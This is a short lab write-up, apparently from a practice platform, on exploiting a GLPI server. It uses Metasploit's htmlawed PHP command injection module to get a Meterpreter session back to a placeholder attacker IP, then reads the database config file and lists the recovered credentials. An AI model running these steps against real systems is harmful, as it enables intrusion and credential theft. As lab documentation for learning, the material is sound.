In this lab, a vulnerability in GLPI was identified and exploited using the
Metasploit Framework.
The goal is to document enumeration, vulnerability research, and exploitation
steps in an ethical and educational manner.
🔎 Enumeration
Service scanning revealed the following open services:
80/tcp – HTTP (Apache)
3306/tcp – MySQL (MariaDB)
The web service was identified as GLPI, an IT asset management application.
🧠 Vulnerability Research
Known GLPI vulnerabilities were searched using Metasploit:
msfconsole
search glpi
A 2022 exploit was identified:
exploit/linux/http/glpi_htmlawed_php_injection
This exploit abuses a PHP Command Injection vulnerability in the
htmlawed plugin of GLPI.
⚙️ Exploit Configuration
Target and attacker settings were configured as follows:
RHOSTS → Target machine (GLPI server)
LHOST → Attacker machine (Kali / HackerBox IP)
use exploit/linux/http/glpi_htmlawed_php_injection
set RHOSTS energysolutions.hv
set LHOST <ATTACKER_IP>
exploit
The exploit executed successfully and a Meterpreter session was obtained.
📂 Unauthorized File Access
Initial access was gained through:
/var/www/html/glpi/vendor/htmlawed/htmlawed
Sensitive configuration files were accessed:
/var/www/html/glpi/config/config_db.php
🗄️ Database Credentials
The following credentials were discovered:
Database User: glpiuser
Database Password: glpi-password
Database Name: glpi
Using these credentials, access to the MySQL database was achieved.
✅ Conclusion
During this lab:
A Remote Code Execution (RCE) vulnerability was successfully exploited
Unauthorized command execution was achieved
Sensitive configuration files were accessed
The database was compromised
⚠️ Disclaimer
This work is strictly for educational purposes.
All activities were conducted in authorized lab environments only.

---
